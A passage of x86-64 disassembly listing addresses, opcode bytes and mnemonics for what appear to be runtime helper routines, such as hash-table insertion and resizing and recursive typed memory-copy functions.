  408858:	4c 89 c8             	mov    %r9,%rax
  40885b:	48 21 d0             	and    %rdx,%rax
  40885e:	48 ff c0             	inc    %rax
  408861:	48 c1 e0 04          	shl    $0x4,%rax
  408865:	48 01 c8             	add    %rcx,%rax
  408868:	4c 8b 00             	mov    (%rax),%r8
  40886b:	4d 85 c0             	test   %r8,%r8
  40886e:	74 18                	je     0x408888
  408870:	4c 39 c6             	cmp    %r8,%rsi
  408873:	75 0e                	jne    0x408883
  408875:	48 8b 50 08          	mov    0x8(%rax),%rdx
  408879:	48 85 d2             	test   %rdx,%rdx
  40887c:	74 0a                	je     0x408888
  40887e:	e9 01 01 00 00       	jmp    0x408984
  408883:	48 ff c2             	inc    %rdx
  408886:	eb d0                	jmp    0x408858
  408888:	4c 8b 76 f8          	mov    -0x8(%rsi),%r14
  40888c:	49 8b 46 10          	mov    0x10(%r14),%rax
  408890:	4c 89 f1             	mov    %r14,%rcx
  408893:	48 8b 10             	mov    (%rax),%rdx
  408896:	e8 a7 c9 ff ff       	call   0x405242
  40889b:	48 89 d9             	mov    %rbx,%rcx
  40889e:	48 89 c2             	mov    %rax,%rdx
  4088a1:	49 89 c4             	mov    %rax,%r12
  4088a4:	e8 d0 ca ff ff       	call   0x405379
  4088a9:	48 8b 5d 00          	mov    0x0(%rbp),%rbx
  4088ad:	48 8b 43 08          	mov    0x8(%rbx),%rax
  4088b1:	48 8d 50 01          	lea    0x1(%rax),%rdx
  4088b5:	48 6b 03 03          	imul   $0x3,(%rbx),%rax
  4088b9:	48 01 d2             	add    %rdx,%rdx
  4088bc:	48 39 c2             	cmp    %rax,%rdx
  4088bf:	7d 76                	jge    0x408937
  4088c1:	48 8d 4a 01          	lea    0x1(%rdx),%rcx
  4088c5:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
  4088ca:	48 c1 e1 04          	shl    $0x4,%rcx
  4088ce:	e8 73 9d ff ff       	call   0x402646
  4088d3:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
  4088d8:	45 31 c9             	xor    %r9d,%r9d
  4088db:	49 89 c7             	mov    %rax,%r15
  4088de:	48 8b 03             	mov    (%rbx),%rax
  4088e1:	48 ff ca             	dec    %rdx
  4088e4:	49 89 07             	mov    %rax,(%r15)
  4088e7:	48 8d 43 10          	lea    0x10(%rbx),%rax
  4088eb:	49 89 57 08          	mov    %rdx,0x8(%r15)
  4088ef:	4c 39 4b 08          	cmp    %r9,0x8(%rbx)
  4088f3:	7c 36                	jl     0x40892b
  4088f5:	4c 8b 00             	mov    (%rax),%r8
  4088f8:	4d 85 c0             	test   %r8,%r8
  4088fb:	74 25                	je     0x408922
  4088fd:	49 c1 f8 08          	sar    $0x8,%r8
  408901:	48 89 d1             	mov    %rdx,%rcx
  408904:	4c 21 c1             	and    %r8,%rcx
  408907:	48 ff c1             	inc    %rcx
  40890a:	48 c1 e1 04          	shl    $0x4,%rcx
  40890e:	4c 01 f9             	add    %r15,%rcx
  408911:	48 83 39 00          	cmpq   $0x0,(%rcx)
  408915:	74 05                	je     0x40891c
  408917:	49 ff c0             	inc    %r8
  40891a:	eb e5                	jmp    0x408901
  40891c:	0f 10 00             	movups (%rax),%xmm0
  40891f:	0f 11 01             	movups %xmm0,(%rcx)
  408922:	49 ff c1             	inc    %r9
  408925:	48 83 c0 10          	add    $0x10,%rax
  408929:	eb c4                	jmp    0x4088ef
  40892b:	48 89 d9             	mov    %rbx,%rcx
  40892e:	e8 ab af ff ff       	call   0x4038de
  408933:	4c 89 7d 00          	mov    %r15,0x0(%rbp)
  408937:	48 8b 55 00          	mov    0x0(%rbp),%rdx
  40893b:	48 8b 4a 08          	mov    0x8(%rdx),%rcx
  40893f:	48 89 c8             	mov    %rcx,%rax
  408942:	48 21 f8             	and    %rdi,%rax
  408945:	48 ff c0             	inc    %rax
  408948:	48 c1 e0 04          	shl    $0x4,%rax
  40894c:	48 01 d0             	add    %rdx,%rax
  40894f:	48 83 38 00          	cmpq   $0x0,(%rax)
  408953:	74 05                	je     0x40895a
  408955:	48 ff c7             	inc    %rdi
  408958:	eb e5                	jmp    0x40893f
  40895a:	48 89 30             	mov    %rsi,(%rax)
  40895d:	48 8b 45 00          	mov    0x0(%rbp),%rax
  408961:	4c 89 e3             	mov    %r12,%rbx
  408964:	48 23 78 08          	and    0x8(%rax),%rdi
  408968:	48 ff c7             	inc    %rdi
  40896b:	48 c1 e7 04          	shl    $0x4,%rdi
  40896f:	4c 89 64 38 08       	mov    %r12,0x8(%rax,%rdi,1)
  408974:	48 8b 45 00          	mov    0x0(%rbp),%rax
  408978:	49 8b 7e 10          	mov    0x10(%r14),%rdi
  40897c:	48 ff 00             	incq   (%rax)
  40897f:	e9 8d fd ff ff       	jmp    0x408711
  408984:	48 89 d9             	mov    %rbx,%rcx
  408987:	48 83 c4 38          	add    $0x38,%rsp
  40898b:	5b                   	pop    %rbx
  40898c:	5e                   	pop    %rsi
  40898d:	5f                   	pop    %rdi
  40898e:	5d                   	pop    %rbp
  40898f:	41 5c                	pop    %r12
  408991:	41 5d                	pop    %r13
  408993:	41 5e                	pop    %r14
  408995:	41 5f                	pop    %r15
  408997:	e9 dd c9 ff ff       	jmp    0x405379
  40899c:	48 8b 0e             	mov    (%rsi),%rcx
  40899f:	48 85 c9             	test   %rcx,%rcx
  4089a2:	74 13                	je     0x4089b7
  4089a4:	48 8b 47 10          	mov    0x10(%rdi),%rax
  4089a8:	48 83 78 30 00       	cmpq   $0x0,0x30(%rax)
  4089ad:	74 08                	je     0x4089b7
  4089af:	ff 50 30             	call   *0x30(%rax)
  4089b2:	48 89 03             	mov    %rax,(%rbx)
  4089b5:	eb 0d                	jmp    0x4089c4
  4089b7:	48 89 0b             	mov    %rcx,(%rbx)
  4089ba:	eb 08                	jmp    0x4089c4
  4089bc:	48 8b 0f             	mov    (%rdi),%rcx
  4089bf:	48 89 df             	mov    %rbx,%rdi
  4089c2:	f3 a4                	rep movsb (%rsi),(%rdi)
  4089c4:	48 83 c4 38          	add    $0x38,%rsp
  4089c8:	5b                   	pop    %rbx
  4089c9:	5e                   	pop    %rsi
  4089ca:	5f                   	pop    %rdi
  4089cb:	5d                   	pop    %rbp
  4089cc:	41 5c                	pop    %r12
  4089ce:	41 5d                	pop    %r13
  4089d0:	41 5e                	pop    %r14
  4089d2:	41 5f                	pop    %r15
  4089d4:	c3                   	ret
  4089d5:	41 56                	push   %r14
  4089d7:	41 55                	push   %r13
  4089d9:	41 54                	push   %r12
  4089db:	55                   	push   %rbp
  4089dc:	57                   	push   %rdi
  4089dd:	56                   	push   %rsi
  4089de:	53                   	push   %rbx
  4089df:	48 83 ec 20          	sub    $0x20,%rsp
  4089e3:	49 89 cc             	mov    %rcx,%r12
  4089e6:	48 89 d5             	mov    %rdx,%rbp
  4089e9:	4c 89 c3             	mov    %r8,%rbx
  4089ec:	4d 89 cd             	mov    %r9,%r13
  4089ef:	8a 03                	mov    (%rbx),%al
  4089f1:	3c 02                	cmp    $0x2,%al
  4089f3:	74 32                	je     0x408a27
  4089f5:	3c 03                	cmp    $0x3,%al
  4089f7:	74 58                	je     0x408a51
  4089f9:	fe c8                	dec    %al
  4089fb:	0f 85 a4 00 00 00    	jne    0x408aa5
  408a01:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
  408a05:	4d 89 e9             	mov    %r13,%r9
  408a08:	4c 8b 43 10          	mov    0x10(%rbx),%r8
  408a0c:	48 8d 54 0d 00       	lea    0x0(%rbp,%rcx,1),%rdx
  408a11:	4c 01 e1             	add    %r12,%rcx
  408a14:	48 83 c4 20          	add    $0x20,%rsp
  408a18:	5b                   	pop    %rbx
  408a19:	5e                   	pop    %rsi
  408a1a:	5f                   	pop    %rdi
  408a1b:	5d                   	pop    %rbp
  408a1c:	41 5c                	pop    %r12
  408a1e:	41 5d                	pop    %r13
  408a20:	41 5e                	pop    %r14
  408a22:	e9 c7 fc ff ff       	jmp    0x4086ee
  408a27:	48 8b 43 20          	mov    0x20(%rbx),%rax
  408a2b:	31 f6                	xor    %esi,%esi
  408a2d:	48 8d 78 ff          	lea    -0x1(%rax),%rdi
  408a31:	48 39 fe             	cmp    %rdi,%rsi
  408a34:	7f 6f                	jg     0x408aa5
  408a36:	48 8b 43 28          	mov    0x28(%rbx),%rax
  408a3a:	4d 89 e9             	mov    %r13,%r9
  408a3d:	48 89 ea             	mov    %rbp,%rdx
  408a40:	4c 89 e1             	mov    %r12,%rcx
  408a43:	4c 8b 04 f0          	mov    (%rax,%rsi,8),%r8
  408a47:	48 ff c6             	inc    %rsi
  408a4a:	e8 86 ff ff ff       	call   0x4089d5
  408a4f:	eb e0                	jmp    0x408a31
  408a51:	48 89 da             	mov    %rbx,%rdx
  408a54:	4c 89 e1             	mov    %r12,%rcx
  408a57:	e8 72 ac ff ff       	call   0x4036ce
  408a5c:	48 89 da             	mov    %rbx,%rdx
  408a5f:	48 89 e9             	mov    %rbp,%rcx
  408a62:	48 89 c6             	mov    %rax,%rsi
  408a65:	e8 64 ac ff ff       	call   0x4036ce
  408a6a:	48 39 c6             	cmp    %rax,%rsi
  408a6d:	49 89 c6             	mov    %rax,%r14
  408a70:	74 10                	je     0x408a82
  408a72:	48 85 f6             	test   %rsi,%rsi
  408a75:	74 0b                	je     0x408a82
  408a77:	48 89 f2             	mov    %rsi,%rdx
  408a7a:	4c 89 e1             	mov    %r12,%rcx
  408a7d:	e8 0f fb ff ff       	call   0x408591
  408a82:	48 8b 73 08          	mov    0x8(%rbx),%rsi
  408a86:	48 8b 53 10          	mov    0x10(%rbx),%rdx
  408a8a:	4c 89 f3             	mov    %r14,%rbx
  408a8d:	49 8d 04 34          	lea    (%r12,%rsi,1),%rax
  408a91:	48 01 ee             	add    %rbp,%rsi
  408a94:	4d 85 f6             	test   %r14,%r14
  408a97:	48 8b 0a             	mov    (%rdx),%rcx
  408a9a:	48 89 c7             	mov    %rax,%rdi
  408a9d:	f3 a4                	rep movsb (%rsi),(%rdi)
  408a9f:	0f 85 4a ff ff ff    	jne    0x4089ef
  408aa5:	48 83 c4 20          	add    $0x20,%rsp
  408aa9:	5b                   	pop    %rbx
  408aaa:	5e                   	pop    %rsi
  408aab:	5f                   	pop    %rdi
  408aac:	5d                   	pop    %rbp
  408aad:	41 5c                	pop    %r12
  408aaf:	41 5d                	pop    %r13
  408ab1:	41 5e                	pop    %r14
  408ab3:	c3                   	ret
  408ab4:	53                   	push   %rbx
  408ab5:	48 83 ec 20          	sub    $0x20,%rsp
  408ab9:	48 89 cb             	mov    %rcx,%rbx
  408abc:	48 8b 0d fd ee 00 00 	mov    0xeefd(%rip),%rcx        # 0x4179c0
  408ac3:	ff 15 4b 28 03 00    	call   *0x3284b(%rip)        # 0x43b314
  408ac9:	48 8b 0d a0 ef 00 00 	mov    0xefa0(%rip),%rcx        # 0x417a70
  408ad0:	48 8d 53 f0          	lea    -0x10(%rbx),%rdx
  408ad4:	e8 59 ac ff ff       	call   0x403732
  408ad9:	48 8b 0d e0 ee 00 00 	mov    0xeee0(%rip),%rcx        # 0x4179c0
  408ae0:	48 83 c4 20          	add    $0x20,%rsp
  408ae4:	5b                   	pop    %rbx
  408ae5:	48 ff 25 80 28 03 00 	rex.W jmp *0x32880(%rip)        # 0x43b36c
  408aec:	41 54                	push   %r12
  408aee:	55                   	push   %rbp
  408aef:	57                   	push   %rdi
  408af0:	56                   	push   %rsi
  408af1:	53                   	push   %rbx
  408af2:	48 83 ec 20          	sub    $0x20,%rsp
  408af6:	48 8d 99 00 31 00 00 	lea    0x3100(%rcx),%rbx
  408afd:	48 89 cf             	mov    %rcx,%rdi
  408b00:	48 8b 03             	mov    (%rbx),%rax
  408b03:	31 f6                	xor    %esi,%esi
  408b05:	4c 8b a3 e8 01 00 00 	mov    0x1e8(%rbx),%r12
  408b0c:	48 8d 68 ff          	lea    -0x1(%rax),%rbp
  408b10:	48 39 ee             	cmp    %rbp,%rsi
  408b13:	7f 16                	jg     0x408b2b
  408b15:	48 89 f0             	mov    %rsi,%rax
  408b18:	48 ff c6             	inc    %rsi
  408b1b:	48 c1 e0 04          	shl    $0x4,%rax
  408b1f:	48 8b 4c 03 08       	mov    0x8(%rbx,%rax,1),%rcx
  408b24:	e8 81 ee ff ff       	call   0x4079aa
  408b29:	eb e5                	jmp    0x408b10
  408b2b:	4d 85 e4             	test   %r12,%r12
  408b2e:	4c 89 e3             	mov    %r12,%rbx
  408b31:	75 cd                	jne    0x408b00
  408b33:	48 8b 8f 78 28 00 00 	mov    0x2878(%rdi),%rcx
  408b3a:	48 85 c9             	test   %rcx,%rcx
  408b3d:	74 0e                	je     0x408b4d
  408b3f:	48 8b 59 10          	mov    0x10(%rcx),%rbx
  408b43:	e8 62 ee ff ff       	call   0x4079aa
  408b48:	48 89 d9             	mov    %rbx,%rcx
  408b4b:	eb ed                	jmp    0x408b3a
  408b4d:	48 c7 87 78 28 00 00 	movq   $0x0,0x2878(%rdi)
  408b54:	00 00 00 00 
  408b58:	48 83 c4 20          	add    $0x20,%rsp
  408b5c:	5b                   	pop    %rbx
  408b5d:	5e                   	pop    %rsi
  408b5e:	5f                   	pop    %rdi
  408b5f:	5d                   	pop    %rbp
  408b60:	41 5c                	pop    %r12
  408b62:	c3                   	ret
  408b63:	57                   	push   %rdi
  408b64:	56                   	push   %rsi
  408b65:	53                   	push   %rbx
  408b66:	48 83 ec 20          	sub    $0x20,%rsp
  408b6a:	be 00 00 00 00       	mov    $0x0,%esi
  408b6f:	48 85 d2             	test   %rdx,%rdx
  408b72:	48 89 cb             	mov    %rcx,%rbx
  408b75:	48 0f 49 f2          	cmovns %rdx,%rsi
  408b79:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
  408b7d:	48 85 c9             	test   %rcx,%rcx
  408b80:	74 06                	je     0x408b88
  408b82:	48 8b 01             	mov    (%rcx),%rax
  408b85:	48 ff c8             	dec    %rax
  408b88:	4c 39 c0             	cmp    %r8,%rax
  408b8b:	49 0f 4f c0          	cmovg  %r8,%rax
  408b8f:	48 29 f0             	sub    %rsi,%rax
  408b92:	48 8d 78 01          	lea    0x1(%rax),%rdi
  408b96:	48 ff c0             	inc    %rax
  408b99:	b8 00 00 00 00       	mov    $0x0,%eax
  408b9e:	48 0f 4c f8          	cmovl  %rax,%rdi
  408ba2:	48 01 f3             	add    %rsi,%rbx
  408ba5:	48 89 f9             	mov    %rdi,%rcx
  408ba8:	e8 06 c7 ff ff       	call   0x4052b3
  408bad:	45 31 c0             	xor    %r8d,%r8d
  408bb0:	49 39 f8             	cmp    %rdi,%r8
  408bb3:	74 0f                	je     0x408bc4
  408bb5:	42 8a 54 03 10       	mov    0x10(%rbx,%r8,1),%dl
  408bba:	42 88 54 00 10       	mov    %dl,0x10(%rax,%r8,1)
  408bbf:	49 ff c0             	inc    %r8
  408bc2:	eb ec                	jmp    0x408bb0
  408bc4:	48 83 c4 20          	add    $0x20,%rsp
  408bc8:	5b                   	pop    %rbx
  408bc9:	5e                   	pop    %rsi
  408bca:	5f                   	pop    %rdi
  408bcb:	c3                   	ret
  408bcc:	49 83 c8 ff          	or     $0xffffffffffffffff,%r8
  408bd0:	48 85 c9             	test   %rcx,%rcx
  408bd3:	74 06                	je     0x408bdb
  408bd5:	48 8b 01             	mov    (%rcx),%rax
  408bd8:	49 01 c0             	add    %rax,%r8
  408bdb:	eb 86                	jmp    0x408b63
  408bdd:	57                   	push   %rdi
  408bde:	56                   	push   %rsi
  408bdf:	48 83 ec 28          	sub    $0x28,%rsp
  408be3:	48 85 c9             	test   %rcx,%rcx
  408be6:	48 89 ce             	mov    %rcx,%rsi
  408be9:	74 2e                	je     0x408c19
  408beb:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
  408bf0:	78 27                	js     0x408c19
  408bf2:	48 8b 09             	mov    (%rcx),%rcx
  408bf5:	48 83 c6 10          	add    $0x10,%rsi
  408bf9:	e8 de 0d 00 00       	call   0x4099dc
  408bfe:	48 8b 56 f0          	mov    -0x10(%rsi),%rdx
  408c02:	48 89 10             	mov    %rdx,(%rax)
  408c05:	48 8b 7e f0          	mov    -0x10(%rsi),%rdi
  408c09:	48 8d 50 10          	lea    0x10(%rax),%rdx
  408c0d:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
  408c11:	48 89 d7             	mov    %rdx,%rdi
  408c14:	f3 a4                	rep movsb (%rsi),(%rdi)
  408c16:	48 89 c6             	mov    %rax,%rsi
  408c19:	48 89 f0             	mov    %rsi,%rax
  408c1c:	48 83 c4 28          	add    $0x28,%rsp
  408c20:	5e                   	pop    %rsi
  408c21:	5f                   	pop    %rdi
  408c22:	c3                   	ret
  408c23:	41 55                	push   %r13
  408c25:	41 54                	push   %r12
  408c27:	55                   	push   %rbp
  408c28:	57                   	push   %rdi
  408c29:	56                   	push   %rsi
  408c2a:	53                   	push   %rbx
  408c2b:	48 83 ec 48          	sub    $0x48,%rsp
  408c2f:	41 8a 40 08          	mov    0x8(%r8),%al
  408c33:	3c 12                	cmp    $0x12,%al
  408c35:	48 89 cb             	mov    %rcx,%rbx
  408c38:	48 89 d6             	mov    %rdx,%rsi
  408c3b:	4c 89 c5             	mov    %r8,%rbp
  408c3e:	44 89 cf             	mov    %r9d,%edi
  408c41:	0f 84 fe 01 00 00    	je     0x408e45
  408c47:	77 1b                	ja     0x408c64
  408c49:	3c 10                	cmp    $0x10,%al
  408c4b:	0f 84 0d 02 00 00    	je     0x408e5e
  408c51:	0f 87 3c 01 00 00    	ja     0x408d93
  408c57:	3c 04                	cmp    $0x4,%al
  408c59:	0f 84 ff 01 00 00    	je     0x408e5e
  408c5f:	e9 49 02 00 00       	jmp    0x408ead
  408c64:	3c 18                	cmp    $0x18,%al
  408c66:	74 44                	je     0x408cac
  408c68:	3c 1c                	cmp    $0x1c,%al
  408c6a:	74 10                	je     0x408c7c
  408c6c:	3c 16                	cmp    $0x16,%al
  408c6e:	0f 85 39 02 00 00    	jne    0x408ead
  408c74:	48 8b 12             	mov    (%rdx),%rdx
  408c77:	e9 1d 02 00 00       	jmp    0x408e99
  408c7c:	48 8b 12             	mov    (%rdx),%rdx
  408c7f:	48 85 d2             	test   %rdx,%rdx
  408c82:	0f 84 11 02 00 00    	je     0x408e99
  408c88:	45 84 c9             	test   %r9b,%r9b
  408c8b:	0f 85 08 02 00 00    	jne    0x408e99
  408c91:	48 83 7a 08 00       	cmpq   $0x0,0x8(%rdx)
  408c96:	0f 88 fd 01 00 00    	js     0x408e99
  408c9c:	48 89 d1             	mov    %rdx,%rcx
  408c9f:	e8 39 ff ff ff       	call   0x408bdd
  408ca4:	48 89 c2             	mov    %rax,%rdx
  408ca7:	e9 ed 01 00 00       	jmp    0x408e99
  408cac:	48 8b 32             	mov    (%rdx),%rsi
  408caf:	48 85 f6             	test   %rsi,%rsi
  408cb2:	74 0c                	je     0x408cc0
  408cb4:	45 84 c9             	test   %r9b,%r9b
  408cb7:	75 07                	jne    0x408cc0
  408cb9:	48 83 7e 08 00       	cmpq   $0x0,0x8(%rsi)
  408cbe:	79 08                	jns    0x408cc8
  408cc0:	48 89 f2             	mov    %rsi,%rdx
  408cc3:	e9 d1 01 00 00       	jmp    0x408e99
  408cc8:	49 8b 40 10          	mov    0x10(%r8),%rax
  408ccc:	f6 40 09 01          	testb  $0x1,0x9(%rax)
  408cd0:	74 6e                	je     0x408d40
  408cd2:	48 8b 3e             	mov    (%rsi),%rdi
  408cd5:	48 89 fa             	mov    %rdi,%rdx
  408cd8:	48 0f af 10          	imul   (%rax),%rdx
  408cdc:	70 06                	jo     0x408ce4
  408cde:	48 83 c2 10          	add    $0x10,%rdx
  408ce2:	71 05                	jno    0x408ce9
  408ce4:	e8 96 d0 ff ff       	call   0x405d7f
  408ce9:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
  408cee:	48 83 c6 10          	add    $0x10,%rsi
  408cf2:	e8 20 9e ff ff       	call   0x402b17
  408cf7:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
  408cfc:	48 89 e9             	mov    %rbp,%rcx
  408cff:	4c 8d 40 38          	lea    0x38(%rax),%r8
  408d03:	e8 c6 0b 00 00       	call   0x4098ce
  408d08:	48 89 d9             	mov    %rbx,%rcx
  408d0b:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  408d12:	48 8b 56 f0          	mov    -0x10(%rsi),%rdx
  408d16:	48 89 78 08          	mov    %rdi,0x8(%rax)
  408d1a:	48 89 10             	mov    %rdx,(%rax)
  408d1d:	48 89 c2             	mov    %rax,%rdx
  408d20:	e8 54 c6 ff ff       	call   0x405379
  408d25:	48 8b 03             	mov    (%rbx),%rax
  408d28:	48 8b 55 10          	mov    0x10(%rbp),%rdx
  408d2c:	48 83 c0 10          	add    $0x10,%rax
  408d30:	48 8b 0a             	mov    (%rdx),%rcx
  408d33:	48 89 c7             	mov    %rax,%rdi
  408d36:	48 0f af 4e f0       	imul   -0x10(%rsi),%rcx
  408d3b:	e9 74 01 00 00       	jmp    0x408eb4
  408d40:	48 8b 16             	mov    (%rsi),%rdx
  408d43:	4c 89 c1             	mov    %r8,%rcx
  408d46:	48 83 c6 10          	add    $0x10,%rsi
  408d4a:	e8 a7 d0 ff ff       	call   0x405df6
  408d4f:	48 89 d9             	mov    %rbx,%rcx
  408d52:	48 89 c2             	mov    %rax,%rdx
  408d55:	e8 1f c6 ff ff       	call   0x405379
  408d5a:	48 8b 3b             	mov    (%rbx),%rdi
  408d5d:	31 db                	xor    %ebx,%ebx
  408d5f:	48 8b 46 f0          	mov    -0x10(%rsi),%rax
  408d63:	48 83 c7 10          	add    $0x10,%rdi
  408d67:	4c 8d 60 ff          	lea    -0x1(%rax),%r12
  408d6b:	4c 39 e3             	cmp    %r12,%rbx
  408d6e:	0f 8f 42 01 00 00    	jg     0x408eb6
  408d74:	4c 8b 45 10          	mov    0x10(%rbp),%r8
  408d78:	48 89 d9             	mov    %rbx,%rcx
  408d7b:	45 31 c9             	xor    %r9d,%r9d
  408d7e:	48 ff c3             	inc    %rbx
  408d81:	49 0f af 08          	imul   (%r8),%rcx
  408d85:	48 8d 14 0e          	lea    (%rsi,%rcx,1),%rdx
  408d89:	48 01 f9             	add    %rdi,%rcx
  408d8c:	e8 92 fe ff ff       	call   0x408c23
  408d91:	eb d8                	jmp    0x408d6b
  408d93:	4d 8b 68 10          	mov    0x10(%r8),%r13
  408d97:	45 0f b6 e1          	movzbl %r9b,%r12d
  408d9b:	4d 85 ed             	test   %r13,%r13
  408d9e:	74 18                	je     0x408db8
  408da0:	4d 8b 45 18          	mov    0x18(%r13),%r8
  408da4:	45 89 e1             	mov    %r12d,%r9d
  408da7:	48 89 f2             	mov    %rsi,%rdx
  408daa:	48 89 d9             	mov    %rbx,%rcx
  408dad:	e8 2d 01 00 00       	call   0x408edf
  408db2:	4d 8b 6d 10          	mov    0x10(%r13),%r13
  408db6:	eb e3                	jmp    0x408d9b
  408db8:	4c 8b 45 18          	mov    0x18(%rbp),%r8
  408dbc:	44 0f b6 cf          	movzbl %dil,%r9d
  408dc0:	48 89 f2             	mov    %rsi,%rdx
  408dc3:	48 89 d9             	mov    %rbx,%rcx
  408dc6:	e8 14 01 00 00       	call   0x408edf
  408dcb:	48 3b 2e             	cmp    (%rsi),%rbp
  408dce:	74 70                	je     0x408e40
  408dd0:	48 8b 0d c9 e7 00 00 	mov    0xe7c9(%rip),%rcx        # 0x4175a0
  408dd7:	ba 30 00 00 00       	mov    $0x30,%edx
  408ddc:	e8 61 c4 ff ff       	call   0x405242
  408de1:	48 8d 0d 58 de 00 00 	lea    0xde58(%rip),%rcx        # 0x416c40
  408de8:	48 89 c3             	mov    %rax,%rbx
  408deb:	48 8b 05 ce e8 00 00 	mov    0xe8ce(%rip),%rax        # 0x4176c0
  408df2:	48 8b 73 18          	mov    0x18(%rbx),%rsi
  408df6:	48 89 03             	mov    %rax,(%rbx)
  408df9:	48 8d 05 e4 dd 00 00 	lea    0xdde4(%rip),%rax        # 0x416be4
  408e00:	48 89 43 10          	mov    %rax,0x10(%rbx)
  408e04:	e8 91 c3 ff ff       	call   0x40519a
  408e09:	48 85 f6             	test   %rsi,%rsi
  408e0c:	48 89 43 18          	mov    %rax,0x18(%rbx)
  408e10:	74 08                	je     0x408e1a
  408e12:	48 89 f1             	mov    %rsi,%rcx
  408e15:	e8 e6 4e 00 00       	call   0x40dd00
  408e1a:	48 c7 44 24 20 31 00 	movq   $0x31,0x20(%rsp)
  408e21:	00 00 
  408e23:	4c 8d 0d d0 dd 00 00 	lea    0xddd0(%rip),%r9        # 0x416bfa
  408e2a:	48 89 d9             	mov    %rbx,%rcx
  408e2d:	4c 8d 05 d0 dd 00 00 	lea    0xddd0(%rip),%r8        # 0x416c04
  408e34:	48 8d 15 a9 dd 00 00 	lea    0xdda9(%rip),%rdx        # 0x416be4
  408e3b:	e8 75 cd ff ff       	call   0x405bb5
  408e40:	48 89 2b             	mov    %rbp,(%rbx)
  408e43:	eb 71                	jmp    0x408eb6
  408e45:	4d 8b 40 18          	mov    0x18(%r8),%r8
  408e49:	45 0f b6 c9          	movzbl %r9b,%r9d
  408e4d:	48 83 c4 48          	add    $0x48,%rsp
  408e51:	5b                   	pop    %rbx
  408e52:	5e                   	pop    %rsi
  408e53:	5f                   	pop    %rdi
  408e54:	5d                   	pop    %rbp
  408e55:	41 5c                	pop    %r12
  408e57:	41 5d                	pop    %r13
  408e59:	e9 81 00 00 00       	jmp    0x408edf
  408e5e:	48 8b 45 00          	mov    0x0(%rbp),%rax
  408e62:	45 0f b6 e9          	movzbl %r9b,%r13d
  408e66:	48 8b 7d 10          	mov    0x10(%rbp),%rdi
  408e6a:	48 99                	cqto
  408e6c:	48 f7 3f             	idivq  (%rdi)
  408e6f:	4c 8d 60 ff          	lea    -0x1(%rax),%r12
  408e73:	31 ff                	xor    %edi,%edi
  408e75:	4c 39 e7             	cmp    %r12,%rdi
  408e78:	7f 3c                	jg     0x408eb6
  408e7a:	4c 8b 45 10          	mov    0x10(%rbp),%r8
  408e7e:	48 89 f9             	mov    %rdi,%rcx
  408e81:	45 89 e9             	mov    %r13d,%r9d
  408e84:	48 ff c7             	inc    %rdi
  408e87:	49 0f af 08          	imul   (%r8),%rcx
  408e8b:	48 8d 14 0e          	lea    (%rsi,%rcx,1),%rdx
  408e8f:	48 01 d9             	add    %rbx,%rcx
  408e92:	e8 8c fd ff ff       	call   0x408c23
  408e97:	eb dc                	jmp    0x408e75
  408e99:	48 89 d9             	mov    %rbx,%rcx
  408e9c:	48 83 c4 48          	add    $0x48,%rsp
  408ea0:	5b                   	pop    %rbx
  408ea1:	5e                   	pop    %rsi
  408ea2:	5f                   	pop    %rdi
  408ea3:	5d                   	pop    %rbp
  408ea4:	41 5c                	pop    %r12
  408ea6:	41 5d                	pop    %r13
  408ea8:	e9 cc c4 ff ff       	jmp    0x405379
  408ead:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
  408eb1:	48 89 df             	mov    %rbx,%rdi
  408eb4:	f3 a4                	rep movsb (%rsi),(%rdi)
  408eb6:	48 83 c4 48          	add    $0x48,%rsp
  408eba:	5b                   	pop    %rbx
  408ebb:	5e                   	pop    %rsi
  408ebc:	5f                   	pop    %rdi
  408ebd:	5d                   	pop    %rbp
  408ebe:	41 5c                	pop    %r12
  408ec0:	41 5d                	pop    %r13
  408ec2:	c3                   	ret
  408ec3:	48 83 ec 38          	sub    $0x38,%rsp
  408ec7:	45 31 c9             	xor    %r9d,%r9d
  408eca:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
  408ecf:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
  408ed4:	e8 4a fd ff ff       	call   0x408c23
  408ed9:	90                   	nop
  408eda:	48 83 c4 38          	add    $0x38,%rsp
  408ede:	c3                   	ret
  408edf:	41 55                	push   %r13
  408ee1:	41 54                	push   %r12
  408ee3:	55                   	push   %rbp
  408ee4:	57                   	push   %rdi
  408ee5:	56                   	push   %rsi
  408ee6:	53                   	push   %rbx
  408ee7:	48 83 ec 38          	sub    $0x38,%rsp
  408eeb:	41 8a 00             	mov    (%r8),%al
  408eee:	3c 02                	cmp    $0x2,%al
  408ef0:	49 89 cc             	mov    %rcx,%r12
  408ef3:	48 89 d5             	mov    %rdx,%rbp
  408ef6:	4c 89 c3             	mov    %r8,%rbx
  408ef9:	45 0f b6 e9          	movzbl %r9b,%r13d
  408efd:	74 30                	je     0x408f2f
  408eff:	3c 03                	cmp    $0x3,%al
  408f01:	74 5a                	je     0x408f5d
  408f03:	fe c8                	dec    %al
  408f05:	0f 85 c4 00 00 00    	jne    0x408fcf
  408f0b:	49 8b 48 08          	mov    0x8(%r8),%rcx
  408f0f:	45 0f b6 c9          	movzbl %r9b,%r9d
  408f13:	4d 8b 40 10          	mov    0x10(%r8),%r8
  408f17:	48 8d 14 0a          	lea    (%rdx,%rcx,1),%rdx
  408f1b:	4c 01 e1             	add    %r12,%rcx
  408f1e:	48 83 c4 38          	add    $0x38,%rsp
  408f22:	5b                   	pop    %rbx
  408f23:	5e                   	pop    %rsi
  408f24:	5f                   	pop    %rdi
  408f25:	5d                   	pop    %rbp
  408f26:	41 5c                	pop    %r12
  408f28:	41 5d                	pop    %r13
  408f2a:	e9 f4 fc ff ff       	jmp    0x408c23
  408f2f:	49 8b 40 20          	mov    0x20(%r8),%rax
  408f33:	31 f6                	xor    %esi,%esi
  408f35:	48 8d 78 ff          	lea    -0x1(%rax),%rdi
  408f39:	48 39 fe             	cmp    %rdi,%rsi
  408f3c:	0f 8f 8d 00 00 00    	jg     0x408fcf
  408f42:	48 8b 43 28          	mov    0x28(%rbx),%rax
  408f46:	45 89 e9             	mov    %r13d,%r9d
